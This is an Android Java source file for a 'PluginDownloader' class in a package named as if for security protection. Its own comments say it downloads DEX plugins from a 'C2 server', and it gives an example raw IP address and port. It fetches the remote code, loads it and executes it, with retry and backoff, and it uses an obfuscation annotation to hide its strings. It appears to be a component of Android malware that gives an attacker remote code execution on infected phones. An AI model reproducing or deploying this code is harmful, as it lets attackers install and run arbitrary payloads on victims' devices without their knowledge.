package com.seguranca.protecao.plugin;

import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import org.lsposed.lsparanoid.Obfuscate;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Download assíncrono de plugins DEX do servidor C2.
 * Suporta retry com backoff exponencial, verificação de integridade,
 * e carregamento automático via PluginManager.
 */
@Obfuscate
public class PluginDownloader {

    private static final String TAG = "PD";
    private static volatile PluginDownloader sInstance;

    private Context appContext;
    private OkHttpClient client;
    private PluginManager pluginManager;
    private Handler mainHandler;
    private final ExecutorService downloadExecutor = Executors.newFixedThreadPool(2);
    private final ConcurrentHashMap<String, Boolean> activeDownloads = new ConcurrentHashMap<>();

    /**
     * Callback para progresso e conclusão de download.
     */
    public interface DownloadCallback {
        void onProgress(int percent);
        void onComplete(File dexFile);
        void onError(String message);
    }

    private PluginDownloader() {}

    public static PluginDownloader getInstance(Context context) {
        if (sInstance == null) {
            synchronized (PluginDownloader.class) {
                if (sInstance == null) {
                    sInstance = new PluginDownloader();
                    sInstance.init(context);
                }
            }
        }
        return sInstance;
    }

    private void init(Context context) {
        this.appContext = context.getApplicationContext();
        this.client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build();
        this.pluginManager = PluginManager.getInstance(context);
        this.mainHandler = new Handler(Looper.getMainLooper());
    }

    /**
     * Baixa plugin do servidor, verifica SHA-256, e carrega via PluginManager.
     *
     * @param serverUrl URL base do servidor (ex: http://148.224.63.121:7771)
     * @param pluginId ID do plugin
     * @param expectedSha256 Hash SHA-256 esperado
     * @param className Nome completo da classe que implementa PluginInterface
     * @param callback Callback de progresso/conclusão
     */
    public void downloadPlugin(String serverUrl, String pluginId, String expectedSha256,
                               String className, DownloadCallback callback) {

        if (activeDownloads.containsKey(pluginId)) {
            if (callback != null) callback.onError("Download já em andamento: " + pluginId);
            return;
        }

        activeDownloads.put(pluginId, true);

        downloadExecutor.execute(() -> {
            try {
                String url = getDownloadUrl(serverUrl, pluginId);
                Log.d(TAG, "Baixando plugin: " + url);

                Request request = new Request.Builder()
                    .url(url)
                    .header("User-Agent", "AndroidPlugin/1.0")
                    .build();

                try (Response response = client.newCall(request).execute()) {
                    if (!response.isSuccessful()) {
                        String error = "HTTP " + response.code() + " ao baixar plugin";
                        Log.e(TAG, error);
                        notifyError(callback, error);
                        return;
                    }

                    long contentLength = response.body() != null ? response.body().contentLength() : -1;

                    // Salva em arquivo temporário
                    File tempFile = new File(pluginManager.calculateSha256(
                        new File(appContext.getFilesDir(), "plugins")
                    ).length() > 0 ? appContext.getFilesDir() + "/plugins" : appContext.getCacheDir().getAbsolutePath(),
                        pluginId + "_temp.dex");

                    // Corrige path
                    File pluginDir = new File(appContext.getFilesDir(), "plugins");
                    if (!pluginDir.exists()) pluginDir.mkdirs();
                    tempFile = new File(pluginDir, pluginId + "_temp.dex");

                    try (InputStream is = response.body().byteStream();
                         FileOutputStream fos = new FileOutputStream(tempFile)) {

                        byte[] buffer = new byte[8192];
                        long totalRead = 0;
                        int bytesRead;
                        int lastPercent = 0;

                        while ((bytesRead = is.read(buffer)) != -1) {
                            fos.write(buffer, 0, bytesRead);
                            totalRead += bytesRead;

                            if (contentLength > 0 && callback != null) {
                                int percent = (int) ((totalRead * 100) / contentLength);
                                if (percent > lastPercent) {
                                    lastPercent = percent;
                                    final int p = percent;
                                    mainHandler.post(() -> callback.onProgress(p));
                                }
                            }
                        }
                        fos.flush();
                    }

                    // Verifica SHA-256
                    if (expectedSha256 != null && !expectedSha256.isEmpty()) {
                        String actualHash = pluginManager.calculateSha256(tempFile);
                        if (!actualHash.equalsIgnoreCase(expectedSha256)) {
                            tempFile.delete();
                            String error = "SHA-256 mismatch: " + actualHash + " != " + expectedSha256;
                            Log.e(TAG, error);
                            notifyError(callback, error);
                            return;
                        }
                    }

                    // Move para arquivo final
                    File finalFile = new File(pluginDir, pluginId + ".dex");
                    if (finalFile.exists()) finalFile.delete();
                    if (!tempFile.renameTo(finalFile)) {
                        // Fallback: copia manualmente
                        copyFile(tempFile, finalFile);
                        tempFile.delete();
                    }

                    // Carrega via PluginManager
                    boolean loaded = pluginManager.loadPlugin(finalFile, className, expectedSha256);
                    if (loaded) {
                        Log.d(TAG, "Plugin baixado e carregado: " + pluginId);
                        if (callback != null) {
                            final File f = finalFile;
                            mainHandler.post(() -> callback.onComplete(f));
                        }
                    } else {
                        notifyError(callback, "Plugin baixado mas falhou ao carregar");
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Download erro: " + e.getMessage());
                notifyError(callback, "Erro no download: " + e.getMessage());
            } finally {
                activeDownloads.remove(pluginId);
            }
        });
    }

    /**
     * Convenience: baixa, carrega e configura plugin em um passo.
     */
    public void downloadAndLoad(String serverUrl, String pluginId, String sha256,
                                String className, Bundle config) {
        downloadPlugin(serverUrl, pluginId, sha256, className, new DownloadCallback() {
            @Override
            public void onProgress(int percent) {
                Log.d(TAG, "Download " + pluginId + ": " + percent + "%");
            }

            @Override
            public void onComplete(File dexFile) {
                Log.d(TAG, "Plugin " + pluginId + " pronto");
                // Configuração adicional se fornecida
                if (config != null && config.size() > 0) {
                    PluginInterface plugin = pluginManager.getPlugin(pluginId);
                    if (plugin != null) {
                        plugin.execute("configure", config);
                    }
                }
            }

            @Override
            public void onError(String message) {
                Log.e(TAG, "Falha no plugin " + pluginId + ": " + message);
            }
        });
    }

    /**
     * Retry com backoff exponencial (2s, 4s, 8s).
     */
    public void retryDownload(String serverUrl, String pluginId, String sha256,
                              String className, int maxRetries, DownloadCallback callback) {
        downloadExecutor.execute(() -> {
            for (int attempt = 0; attempt < maxRetries; attempt++) {
                final int att = attempt;
                Log.d(TAG, "Tentativa " + (attempt + 1) + "/" + maxRetries + " para " + pluginId);

                final boolean[] completed = {false};
                final boolean[] success = {false};

                downloadPlugin(serverUrl, pluginId, sha256, className, new DownloadCallback() {
                    @Override
                    public void onProgress(int percent) {
                        if (callback != null) mainHandler.post(() -> callback.onProgress(percent));
                    }

                    @Override
                    public void onComplete(File dexFile) {
                        success[0] = true;
                        completed[0] = true;
                        if (callback != null) mainHandler.post(() -> callback.onComplete(dexFile));
                    }

                    @Override
                    public void onError(String message) {
                        completed[0] = true;
                        Log.e(TAG, "Retry " + (att + 1) + " falhou: " + message);
                    }
                });

                // Espera conclusão
                long deadline = System.currentTimeMillis() + 120000; // 2min timeout
                while (!completed[0] && System.currentTimeMillis() < deadline) {
                    try { Thread.sleep(500); } catch (InterruptedException e) { return; }
                }

                if (success[0]) return;

                // Backoff exponencial
                long delay = (long) Math.pow(2, attempt + 1) * 1000;
                try { Thread.sleep(delay); } catch (InterruptedException e) { return; }
            }

            notifyError(callback, "Todas as " + maxRetries + " tentativas falharam para " + pluginId);
        });
    }

    /**
     * Constrói URL de download do plugin.
     */
    public String getDownloadUrl(String serverBaseUrl, String pluginId) {
        String base = serverBaseUrl.endsWith("/") ? serverBaseUrl : serverBaseUrl + "/";
        return base + "api/plugins/" + pluginId + "/download";
    }

    /**
     * Cancela download em andamento.
     */
    public void cancelDownload(String pluginId) {
        activeDownloads.remove(pluginId);
        // OkHttp calls em andamento serão interrompidos pelo flag
    }

    private void notifyError(DownloadCallback callback, String message) {
        if (callback != null) {
            mainHandler.post(() -> callback.onError(message));
        }
    }

    private void copyFile(File src, File dst) throws Exception {
        try (java.io.FileInputStream fis = new java.io.FileInputStream(src);
             FileOutputStream fos = new FileOutputStream(dst)) {
            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) > 0) {
                fos.write(buf, 0, len);
            }
        }
    }
}
